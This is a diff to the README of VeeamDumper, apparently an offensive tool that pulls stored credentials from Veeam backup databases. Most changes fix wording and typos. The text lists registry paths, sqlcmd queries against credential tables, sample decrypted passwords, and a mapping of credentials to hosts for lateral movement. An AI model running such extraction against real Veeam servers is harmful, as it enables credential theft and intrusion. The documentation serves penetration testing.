@@ -52,7 +52,7 @@ Options:
   -p <psqlPath>    Override path to psql.exe
   -l               Enumerate usernames of credentials stored in the database
   -u <username>    Decrypt credentials for only a specific user in the database
-  -o               Target VeeamOne instead of Veeam Backup and Replication
+  -o               Target Veeam One instead of Veeam Backup and Replication
   -d               Enable debug output for all steps
   -h, --help       Show this help menu
 
@@ -78,16 +78,16 @@ The tool supports extracting credentials from both Microsoft SQL Server (MSSQL) 
 
 ## Features
 
-- **ENUM** -- Enumerate the host for information relevant to the tool. This module will identify paths for the `sqlcmd.exe` and `psql.exe` binaries,  identify database processes, and perform Windows Registry enumeration for the Veeam installation type and configuration thereof. 
+- **ENUM** -- Enumerate the host for information relevant to the tool. This module will identify paths for the `sqlcmd.exe` and `psql.exe` binaries, identify database processes, and perform Windows Registry enumeration for the Veeam installation type and configuration thereof. 
 - **AUTO** -- Automatically performs enumeration to identify the Veeam installation type, database software, and then subsequently decrypts all available credential material stored in the database. 
-- **MSSQL/PSQL** -- Provides a more fine-grained approach to extracting credentials from an MSSQL or PSQL database. These modules provide the ability to list all available users without performing any decryption, as well as target a specific user on which to perform decryption instead of all users. 
+- **MSSQL/PSQL** -- Provides a more fine-grained approach to extracting credentials from an MSSQL or PSQL database. These modules provide the ability to list all available users without performing any decryption, as well as target a specific user on which to perform decryption. 
 - **MAP** -- Performs a database query to map the stored credentials, to the hosts where they are used. This provides an indication of where these credentials could be used to gain access to sensitive systems or to perform additional lateral movement. 
 
 The following describes at a high-level how the VeeamDumper tooling works:
 
-###  Database Access
+### Database Access
 
-The tool uses LOLBins to execute database queries, however the binaries can also be manually uploaded 
+The tool uses uses legitimate database client binaries already present on the server to execute database queries, however the binaries can also be manually uploaded and their paths supplied via the `-m` and `-p` flags. 
 - Executes `sqlcmd.exe` for MSSQL
 - Executes `psql.exe` for PostgreSQL
 - Parses colon-delimited output
@@ -98,7 +98,7 @@ The tool reads configuration and cryptographic material from the following Windo
 
 **Veeam Backup & Replication:** 
 - `HKLM\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\SqlActiveConfiguration`
-- `HKLM\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\mssql\SQLInstaneName`
+- `HKLM\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\mssql\SQLInstanceName`
 - `HKLM\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\mssql\SqlDatabaseName`
 - `HKLM\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\postgresql\PostgresUserForWindowsAuth`
 - `HKLM\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\postgresql\SqlDatabaseName` 
@@ -178,7 +178,7 @@ The following sections describe example usage of the VeeamDumper tooling for ext
 |       VEEAM AUTO EXTRACTION       |
 =====================================
 [INFO] Veeam Backup and Replication Registry Entries Exist: True
-[INFO] VeeamONE Registry Entries Exist: False
+[INFO] Veeam One Registry Entries Exist: False
 [INFO] Performing Veeam Backup and Replication Extraction
 [INFO] Database type found in Registry: PostgreSql
   - PSQL username: postgres
@@ -197,7 +197,7 @@ Password   : VeeamB@ckup@cc0unt!1
 Description: LocalAdmin account to perform backup jobs
 ---------------------------------------------
 ```
-### Auto Mode on VeeamOne
+### Auto Mode on Veeam One
 ```
 .\VeeamDumper.exe auto
 
@@ -205,10 +205,10 @@ Description: LocalAdmin account to perform backup jobs
 |       VEEAM AUTO EXTRACTION       |
 =====================================
 [INFO] Veeam Backup and Replication Registry Entries Exist: False
-[INFO] VeeamONE Registry Entries Exist: True
-[INFO] Performing VeeamONE Extraction
-[INFO] Loaded VeeamOne Entropy value (32 bytes)
-[INFO] VeeamOne info found in Registry:
+[INFO] Veeam One Registry Entries Exist: True
+[INFO] Performing Veeam One Extraction
+[INFO] Loaded Veeam One Entropy value (32 bytes)
+[INFO] Veeam One info found in Registry:
   - Database name found in Registry: VeeamONE
   - Database server found in Registry: .\VEEAMSQL2017
 [INFO] Running command: sqlcmd.exe -S .\VEEAMSQL2017 -E -d VeeamONE -Q "SELECT username,password,description FROM [monitor].[Credentials];" -s":" -y 0 -Y 0
@@ -293,14 +293,14 @@ Password   : VeeamB@ckup@cc0unt!1
 Description: LocalAdmin account to perform backup jobs
 ---------------------------------------------
 ```
-### Target VeeamONE instead of Veeam Backup and Replication
+### Target Veeam One instead of Veeam Backup and Replication
 ```
 .\VeeamDumper.exe mssql -o
 
 [INFO] MSSQL instance: VeeamSQL2017
 [INFO] Database: VeeamONE
 [INFO] Sqlcmd.exe path: sqlcmd.exe
-[INFO] Loaded VeeamOne Entropy value (32 bytes)
+[INFO] Loaded Veeam One Entropy value (32 bytes)
 [INFO] Running command: sqlcmd.exe -S .\VeeamSQL2017 -E -d VeeamONE -Q "SELECT username,password,description FROM [monitor].[Credentials];" -s":" -y 0 -Y 0
 =====================================
 |        JUICY CREDS LOADING        |
@@ -348,14 +348,14 @@ Administrator    > 192.168.56.38
 LocalAdmin       > 192.168.56.89
 -----------------------------------------------
 ```
-### Map Credentials to Hosts on VeeamOne
+### Map Credentials to Hosts on Veeam One
 ```
 .\VeeamDumper.exe map -o
 
 =====================================
 |        MAPPING CREDENTIALS        |
 =====================================
-[INFO] VeeamOne info found in Registry:
+[INFO] Veeam One info found in Registry:
   - Database name found in Registry: VeeamONE
   - Database server found in Registry: .\VEEAMSQL2017
 [INFO] Running command: sqlcmd.exe -S .\VEEAMSQL2017 -E -d VeeamONE -Q "SELECT t1.username,STRING_AGG(t3.host_name, ', ') as hosts FROM [monitor].[Credentials] AS t1 INNER JOIN [monitor].[CredentialsLink] AS t2 ON t1.id = t2.cred_id INNER JOIN [monitor].[Entity] AS t3 ON t2.entity_id = t3.host_id GROUP BY t1.username ORDER BY t1.username;" -s":" -y 0 -Y 0
